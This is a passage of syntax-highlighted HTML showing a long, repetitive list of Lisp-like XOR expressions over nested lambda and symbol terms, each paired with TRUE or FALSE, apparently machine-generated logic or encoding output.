class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] FALSE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]] TRUE)) (<span class="hljs-name">XOR</span> [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span 